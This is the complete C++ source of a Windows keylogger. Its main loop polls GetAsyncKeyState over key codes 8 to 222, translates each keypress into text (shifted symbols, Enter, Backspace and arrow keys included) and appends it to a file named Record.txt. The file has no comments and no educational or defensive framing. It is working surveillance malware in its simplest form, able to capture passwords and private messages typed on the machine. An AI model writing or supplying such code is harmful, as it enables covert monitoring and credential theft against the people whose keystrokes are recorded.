#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

string GetKeyText(int key, bool shiftPressed) {
    // Letters
    if (key >= 'A' && key <= 'Z') {
        return string(1, shiftPressed ? key : tolower(key));
    }

    // Numbers and symbols
    if (key >= '0' && key <= '9') {
        if (shiftPressed) {
            switch (key) {
                case '1': return "!";
                case '2': return "@";
                case '3': return "#";
                case '4': return "$";
                case '5': return "%";
                case '6': return "^";
                case '7': return "&";
                case '8': return "*";
                case '9': return "(";
                case '0': return ")";
            }
        } else {
            return string(1, key);
        }
    }

    // Special characters and punctuation
    switch (key) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[ENTER]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "";  // Ignore shift itself
        case VK_ESCAPE: return "[ESC]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_OEM_1: return shiftPressed ? ":" : ";";
        case VK_OEM_2: return shiftPressed ? "?" : "/";
        case VK_OEM_3: return shiftPressed ? "~" : "`";
        case VK_OEM_4: return shiftPressed ? "{" : "[";
        case VK_OEM_5: return shiftPressed ? "|" : "\\";
        case VK_OEM_6: return shiftPressed ? "}" : "]";
        case VK_OEM_7: return shiftPressed ? "\"" : "'";
        case VK_OEM_COMMA: return shiftPressed ? "<" : ",";
        case VK_OEM_PERIOD: return shiftPressed ? ">" : ".";
        case VK_OEM_MINUS: return shiftPressed ? "_" : "-";
        case VK_OEM_PLUS: return shiftPressed ? "+" : "=";
        default:
            return "";  // Unhandled key
    }
}

int main() {
    bool keyPressed[256] = {false};

    for (;;) {
        Sleep(10); // prevent 100% CPU usage
        for (int key = 8; key <= 222; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                if (!keyPressed[key]) {
                    keyPressed[key] = true;

                    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);

                    string output = GetKeyText(key, shiftPressed);
                    if (!output.empty()) {
                        ofstream write("Record.txt", ios::app);
                        write << output;
                        write.close();
                    }
                }
            } else {
                keyPressed[key] = false;
            }
        }
    }
    return 0;
}
